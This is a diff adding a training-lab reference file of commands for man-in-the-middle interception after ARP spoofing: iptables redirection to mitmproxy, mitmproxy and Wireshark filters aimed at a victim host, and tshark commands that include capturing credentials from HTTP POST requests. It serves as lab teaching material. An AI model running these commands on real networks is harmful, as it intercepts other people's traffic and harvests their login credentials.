@@ -1,0 +1,71 @@
+# ==============================================================================
+# File: 03_traffic_interception_commands.txt
+# Purpose: Reference commands for traffic interception, proxying & packet analysis
+# Lab: NTI Cybersecurity Training Lab - MITM via ARP Spoofing
+# Researcher: Solo Security Researcher
+# ==============================================================================
+
+--------------------------------------------------------------------------------
+1. IPTABLES REDIRECTION (For Transparent mitmproxy Interception)
+--------------------------------------------------------------------------------
+# Route intercepted HTTP (Port 80) traffic to local mitmproxy listener (Port 8080)
+sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+# (Optional) Route intercepted HTTPS (Port 443) traffic to local mitmproxy (Port 8080)
+# Note: Intercepting TLS requires victim trust of mitmproxy CA certificate
+sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+# Check active NAT redirection rules:
+sudo iptables -t nat -L PREROUTING -n -v --line-numbers
+
+# TEARDOWN: Clear NAT rules when finished with the lab
+sudo iptables -t nat -F PREROUTING
+
+
+--------------------------------------------------------------------------------
+2. MITMPROXY / MITMWEB INTERCEPTION (HTTP/HTTPS Inspection)
+--------------------------------------------------------------------------------
+# Interactive Terminal UI: Launch mitmproxy in transparent mode
+mitmproxy --mode transparent --listen-port 8080 --showhost
+
+# Web-based UI: Launch mitmweb (Accessible via browser at http://127.0.0.1:8081)
+mitmweb --mode transparent --listen-port 8080 --web-port 8081 --showhost
+
+# Filter mitmproxy flows:
+# Press 'f' in mitmproxy to set a view filter:
+# Example: ~m POST                   (Show only POST requests)
+# Example: ~u login                  (Show URLs containing "login")
+# Example: ~d example.com            (Show requests destined for example.com)
+
+
+--------------------------------------------------------------------------------
+3. WIRESHARK (Graphical Packet Analysis)
+--------------------------------------------------------------------------------
+# Launch Wireshark live capture on interface eth0 in background:
+sudo wireshark -i eth0 -k &
+
+# Useful Wireshark Display Filters for MITM Analysis:
+# - Isolate ARP spoofing & duplicate MAC notifications:
+  arp.duplicate-address-frame || arp.opcode == 2
+
+# - Filter all traffic between the victim host and any destination:
+  ip.addr == 192.168.1.100
+
+# - Isolate cleartext HTTP GET/POST requests from the victim:
+  ip.addr == 192.168.1.100 && (http.request.method == "GET" || http.request.method == "POST")
+
+# - Inspect DNS requests made by the victim:
+  ip.addr == 192.168.1.100 && udp.port == 53
+
+
+--------------------------------------------------------------------------------
+4. TSHARK (Command-Line Live Packet Sniffer)
+--------------------------------------------------------------------------------
+# Capture and display HTTP requests with host and URI in terminal:
+sudo tshark -i eth0 -Y 'http.request' -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri -e http.user_agent
+
+# Capture credentials submitted via HTTP POST requests:
+sudo tshark -i eth0 -Y 'http.request.method == "POST"' -T text -x
+
+# Save capture to PCAP file for offline forensics:
+sudo tshark -i eth0 -w /tmp/mitm_session_capture.pcap -f "host 192.168.1.100"
